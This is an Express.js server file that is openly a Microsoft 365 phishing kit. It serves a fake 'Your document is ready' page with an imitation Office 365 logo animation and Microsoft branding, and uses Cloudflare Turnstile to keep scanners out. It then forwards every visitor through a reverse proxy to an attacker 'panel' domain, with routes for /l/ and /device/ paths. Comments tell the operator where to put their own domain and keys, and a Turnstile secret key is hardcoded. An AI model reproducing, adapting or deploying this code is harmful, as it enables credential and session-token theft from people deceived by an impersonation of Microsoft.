const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const app = express();
const port = process.env.PORT || 3000;

// ⚠️ YOUR PANEL DOMAIN (change if different)
const PANEL_DOMAIN = 'portal42-343.sbs';

// ⚠️ YOUR RENDER URL (change to your actual Render URL)
const RENDER_URL = 'https://shared-documents.onrender.com';

// ⚠️ CLOUDFLARE TURNSTILE KEYS (use the ones from your friend or your own)
const TURNSTILE_SITEKEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
const TURNSTILE_SECRET = '0x4AAAAAAAAEs9ayeKqC1MX6dKR--8FLZtOJE';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

function generateToken() {
    return crypto.randomBytes(32).toString('hex');
}

// Middleware: check CAPTCHA verification
function requireCaptcha(req, res, next) {
    const token = req.cookies.captcha_token;
    if (token && token === req.cookies.captcha_verified) {
        return next();
    }
    // Show the CAPTCHA page
    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
}

// 🔥 The CAPTCHA Page with Animated Office 365 Logo (from your friend's source)
app.get('/captcha', (req, res) => {
    const returnUrl = req.query.return || '/';
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Redirect</title>
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
        "Helvetica Neue", Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background: #f5f5f5;
    }

    .container {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 400px;
    }

    .error {
      color: #d32f2f;
      padding: 20px;
      background: #ffebee;
      border-radius: 4px;
    }

    .loading {
      color: #1976d2;
      padding: 20px;
    }

    #cf-turnstile {
      display: flex;
      justify-content: center;
      margin: 20px 0;
    }
    #contBtn {
      margin:20px auto;
      display:block; 
      padding:12px 20px; 
      background:#32a0da; 
      color:#fff; 
      border:none; 
      border-radius:4px; 
      font-size:15px; 
      font-weight:600; 
      font-family:'Segoe UI', Arial, sans-serif; 
      cursor:pointer; 
      transition:background-color .2s ease, box-shadow .2s ease, transform .1s ease; box-shadow:0 2px 6px rgba(0,0,0,.15);
    }
    :root {
      --s: 180px;
      --envW: 130px;
      --envH: 71px;
      --calW: 118px;
      --sqW: calc(var(--calW) / 3);
      --sqH: 37px;
      --calHH: 20px;
      --calH: calc(var(--sqH) * 3 + var(--calHH));
      --calY: calc(var(--calH) + 20px);
      --calYExt: calc(var(--calH) - 80px);
      --calYOverExt: calc(var(--calH) - 92px);
      --flapS: 96px;
      --flapH: calc(0.55 * var(--envH));
      --flapScaleY: calc(var(--flapH) / var(--flapWidth));
      --dur: 5s
    }

    #subcontainer {
      width: var(--s);
      height: var(--s);
      animation: bounce var(--dur) infinite
    }

    @keyframes bounce {
      0%, 100%, 12.5%, 32.5%, 76.1% { transform: translateY(0) }
      22.5%, 86% { transform: translateY(7px) }
    }

    #logo {
      height: 179px;
      width: 130px;
      overflow: hidden;
      margin-top: -59px;
      margin-left: 79px
    }

    #containerShadow {
      position: relative;
      top: 120px;
      left: 79px;
      width: var(--envW);
      height: var(--envH);
      border-radius: 0 0 7px 7px;
      box-shadow: rgba(0, 0, 0, .25) 0 4px 5px;
      animation: shadow-fade var(--dur) infinite
    }

    @keyframes shadow-fade {
      0%, 100%, 21.2%, 80% { opacity: 0 }
      47%, 70% { opacity: 1 }
    }

    #flapContainer {
      width: var(--envW);
      margin-top: 179px
    }

    #ef {
      width: var(--envW);
      height: var(--envH);
      border-radius: 0 0 7px 7px;
      overflow: hidden;
      margin-top: -41px
    }

    #ef>.l {
      width: 287px;
      height: var(--envH);
      background: #28a8ea;
      transform: translate(-153px, -70px) rotate(28deg)
    }

    #ef>.r {
      width: 287px;
      height: var(--envH);
      background: #1490df;
      transform: translate(-120px, 63px) rotate(-28deg)
    }

    #eb {
      width: var(--envW);
      height: 40px;
      background: #123b6d;
      margin-top: -70px
    }

    #cal {
      display: flex;
      flex-wrap: wrap;
      width: var(--calW);
      height: var(--calH);
      border-radius: 7px;
      overflow: hidden;
      margin: 0 auto;
      margin-top: -306px;
      animation: cal-bounce var(--dur) infinite;
      animation-timing-function: cubic-bezier(0, 0.5, 0, 1);
      transform: translateY(var(--calYExt)) scaleY(1)
    }

    @keyframes cal-bounce {
      0%, 100%, 16.5%, 76.1% { transform: translateY(var(--calY)) scaleY(1) }
      28% { transform: translateY(var(--calYOverExt)) scaleY(1) }
      31% { transform: translateY(var(--calYExt)) scaleY(1.05) }
      33% { transform: translateY(var(--calYExt)) scaleY(.96) }
      34%, 68.5% { transform: translateY(var(--calYExt)) scaleY(1) }
      68.5% { animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29) }
    }

    #cal>.t {
      width: var(--calW);
      height: calc(var(--calHH) + 1px);
      margin-bottom: -1px;
      background: #0358a7
    }

    #cal>.r {
      display: flex;
      width: var(--calW);
      height: var(--sqH)
    }

    .s {
      width: var(--sqW);
      height: calc(var(--sqH) + 1px)
    }
    .s1 { background: #0078d4 }
    .s2 { background: #28a8ea }
    .s3 { background: #50d9ff }
    .s4 { background: #0364b8 }
    .s5 { background: #14447d }

    #openedFlap {
      width: var(--envW);
      height: 107px;
      animation: opened-flap-swing var(--dur) infinite;
      animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
      transform-origin: top;
      transform: translateY(-68px) rotate3d(1, 0, 0, -180deg)
    }

    @keyframes opened-flap-swing {
      0%, 100%, 14.5%, 76% { transform: translateY(-68px) rotate3d(1, 0, 0, -90deg) }
      16.5%, 74% { transform: translateY(-68px) rotate3d(1, 0, 0, -180deg) }
    }

    #closedFlap {
      width: var(--envW);
      animation: closed-flap-swing var(--dur) infinite;
      animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
      transform-origin: top;
      transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg)
    }

    @keyframes closed-flap-swing {
      0%, 100%, 77%, 8.5% { transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0) }
      14.5%, 76% { transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg) }
    }

    #fmask {
      width: var(--envW);
      height: 107px;
      overflow: hidden
    }

    .flapTriangle {
      width: 96px;
      height: 96px;
      background: #50d9ff;
      margin: -48px auto 0 auto;
      border-radius: 7px;
      transform: scaleY(.6) rotate(45deg)
    }
    #openedFlap .flapTriangle { background: #123b6d }
    #closedFlap .flapTriangle { background: #50d9ff }
    #dp { margin-top: 20px; }
  </style>
</head>

<body>
  <div class="container">
    <div id="loadingLogo" dir=ltr>
      <div id=subcontainer>
        <div id=containerShadow></div>
        <div id=logo>
          <div id=flapContainer>
            <div id=openedFlap>
              <div id=fmask>
                <div class=flapTriangle></div>
              </div>
            </div>
            <div id=cal>
              <div class=t></div>
              <div class=r>
                <div class="s s1"></div>
                <div class="s s2"></div>
                <div class="s s3"></div>
              </div>
              <div class=r>
                <div class="s s4"></div>
                <div class="s s1"></div>
                <div class="s s2"></div>
              </div>
              <div class=r>
                <div class="s s5"></div>
                <div class="s s4"></div>
                <div class="s s1"></div>
              </div>
            </div>
          </div>
          <div id=eb></div>
          <div id=ef>
            <div class=r></div>
            <div class=l></div>
          </div>
          <div id=closedFlap>
            <div id=fmask>
              <div class=flapTriangle></div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="dp"></div>
    <div style="display:none" id="cont">
      <h3>Your document is ready.</h3>
      <p>
        This document is protected to help safeguard its contents. Before it can be viewed, you'll be asked to complete a brief verification step.
        Select Continue to proceed and follow the instructions.
      </p>
      <button class="primary" id="contBtn" onmouseover="this.style.background='#b22b2f';this.style.boxShadow='0 4px 10px rgba(0,0,0,.2)'" onmouseout="this.style.background='#d13438';this.style.boxShadow='0 2px 6px rgba(0,0,0,.15)'" onmousedown="this.style.transform='scale(0.98)'" onmouseup="this.style.transform='scale(1)'" onclick="window.location.href='${RENDER_URL}${returnUrl}'">Continue</button>
    </div>
    <div id="cf-turnstile"></div>
    <div id="status"></div>
    <img src="https://res.cdn.office.net/assets/framework/microsoft.svg" id="MSLogo" alt="MS">
  </div>
  <script>
    const targetUrl = "${RENDER_URL}${returnUrl}";
    const messages = ["Loading...", "Processing request...", "Preparing results...", "Almost there...", "Finalizing..."];
    let index = 0;
    function cycleMessages() {
      const dp = document.getElementById("dp");
      dp.textContent = messages[index];
      index = (index + 1) % messages.length;
    }
    cycleMessages();
    setInterval(cycleMessages, 3000);

    function turnstileCallback(token) {
      if (token) {
        // Send the token to the server for verification
        fetch('/verify-captcha', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token: token, returnUrl: '${returnUrl}' })
        })
        .then(r => r.json())
        .then(data => {
          if (data.success) {
            window.location.href = data.redirect;
          } else {
            document.getElementById("status").innerHTML = '<p class="error">Verification failed. Please try again.</p>';
            turnstile.reset();
          }
        })
        .catch(() => {
          document.getElementById("status").innerHTML = '<p class="error">Network error. Please try again.</p>';
          turnstile.reset();
        });
      }
    }

    function turnstileErrorCallback() {
      setTimeout(() => { window.location.reload(); }, 1000);
    }

    function turnstileExpiredCallback() {
      if (window.turnstile) { turnstile.reset(); }
    }

    function onTurnstileLoad() {
      const statusEl = document.getElementById("status");
      const container = document.getElementById("cf-turnstile");

      turnstile.render("#cf-turnstile", {
        sitekey: "${TURNSTILE_SITEKEY}",
        theme: "light",
        callback: turnstileCallback,
        "error-callback": turnstileErrorCallback,
        "expired-callback": turnstileExpiredCallback,
      });
    }
  </script>
</body>
</html>
    `);
});

// Verification endpoint
app.post('/verify-captcha', async (req, res) => {
    const { token, returnUrl } = req.body;
    if (!token) return res.json({ success: false, error: 'Missing token' });

    try {
        const form = new URLSearchParams();
        form.append('secret', TURNSTILE_SECRET);
        form.append('response', token);

        const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            body: form
        });
        const data = await response.json();

        if (data.success) {
            const t = generateToken();
            res.cookie('captcha_token', t, { maxAge: 3600000, httpOnly: true, secure: true });
            res.cookie('captcha_verified', t, { maxAge: 3600000, httpOnly: true, secure: true });
            return res.json({ success: true, redirect: returnUrl || '/' });
        }
        return res.json({ success: false, error: 'Invalid token' });
    } catch (e) {
        console.error('Verification error:', e);
        return res.json({ success: false, error: 'Server error' });
    }
});

// Protect /l/* and /device/* with CAPTCHA
app.use('/l/*', requireCaptcha);
app.use('/device/*', requireCaptcha);

// The Main Proxy
app.use('*', async (req, res) => {
    try {
        const targetUrl = new URL(req.originalUrl, `https://${PANEL_DOMAIN}`);
        const headers = new Headers(req.headers);
        headers.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        headers.delete('host');

        const options = { method: req.method, headers: headers };
        if (req.method !== 'GET' && req.method !== 'HEAD') {
            options.body = req.body;
        }

        const response = await fetch(targetUrl.toString(), options);
        let body = await response.text();
        const contentType = response.headers.get('content-type') || '';

        res.status(response.status).set('Content-Type', contentType).send(body);
    } catch (e) {
        console.error('Proxy error:', e);
        res.status(500).send('Proxy Error');
    }
});

app.listen(port, () => {
    console.log(`✅ Proxy running on port ${port}`);
});
